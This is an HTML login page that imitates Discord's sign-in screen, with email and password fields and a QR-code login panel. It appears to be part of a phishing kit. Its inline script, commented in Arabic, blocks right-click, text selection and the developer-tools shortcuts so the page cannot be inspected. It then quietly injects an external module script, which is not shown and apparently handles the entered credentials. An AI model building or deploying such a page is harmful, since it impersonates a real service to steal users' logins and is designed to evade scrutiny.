<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="referrer" content="no-referrer">
    <meta name="robots" content="noindex, nofollow">
    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
    <link rel="stylesheet" href="./css/index.css">
    <link rel="stylesheet" href="css/main.css">
    <title>Login Portal</title>
    <style>
        /* إضافة أنماط إضافية للحماية */
        html {
            -webkit-touch-callout: none;
            -webkit-user-select: none;
            -khtml-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
        }
        body {
            visibility: hidden;
        }
        .loaded {
            visibility: visible;
        }
    </style>
</head>

<body>
    <img src="./assets/bg.svg" alt="Background" class="bg">
    <div class="login-page">
        <div class="svg-logo-text">
            <img src="./assets/login-screen-logo.svg" alt="Logo">
        </div>


        <main class="main">
            <div class="authBox">
                <div class="main-form">

                    <form action="#">
                        <div class="input-groups">
                            <div class="main-form-header">
                                <h1>Welcome to the portal</h1>
                                <p>Please sign in to continue</p>
                            </div>
                            <div class="email-wrapper">
                                <label for="emailORphone">
                                    EMAIL OR PHONE NUMBER
                                    <span class="required">*</span>
                                </label>
                                <input type="text" id="emailORphone">
                            </div>
                            <div class="password-wrapper">
                                <label for="password">
                                    PASSWORD
                                    <span class="required">*</span>
                                </label>
                                <input type="password" id="password">
                            </div>
                        </div>
                        <div class="forgot-password">
                            <a href="#">Forgot your password?</a>
                        </div>
                        <div class="login">
                            <button type="submit">
                                Log In
                            </button>
                        </div>
                        <div class="small-register">
                            <span>Need an account?</span>
                            <a href="#">Register</a>
                        </div>
                    </form>
                </div>

                <div class="right-section">
                    <div class="login-container">
                        <div class="qr-code">
                            <svg xmlns="http://www.w3.org/2000/svg" height="160" viewBox="0 0 37 37" width="160">
                                <path
                                    d=""
                                    fill="#ffffff"></path>
                                <path
                                    d=""
                                    fill="#000000"></path>
                            </svg>
                            <img src="./assets/qrcode-discord-logo.png" alt="Discord Logo">
                        </div>
                        <h2>Log in with QR Code</h2>
                        <p>Scan this with the <strong>Discord mobile app</strong> to log in instantly.</p>
                        <a href="#">Or, sign in with passkey</a>
                    </div>
                </div>


            </div>
        </main>
    </div>
    <!-- تحميل السكريبت بطريقة مؤجلة ومشفرة -->
    <script>
        // إضافة فئة loaded بعد تحميل الصفحة لإظهار المحتوى
        document.addEventListener('DOMContentLoaded', function() {
            setTimeout(function() {
                document.body.classList.add('loaded');
            }, 100);
        });
        
        // تحميل السكريبت بشكل ديناميكي
        (function() {
            const s = document.createElement('script');
            s.type = 'module';
            s.src = './js/script.js';
            s.async = true;
            document.body.appendChild(s);
        })();
        
        // منع القائمة المنسدلة بزر الماوس الأيمن
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
        });
        
        // منع فتح أدوات المطور
        document.addEventListener('keydown', function(e) {
            // منع F12
            if (e.keyCode === 123) {
                e.preventDefault();
            }
            
            // منع Ctrl+Shift+I / Ctrl+Shift+J / Ctrl+Shift+C
            if (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) {
                e.preventDefault();
            }
        });
    </script>
</body>

</html>
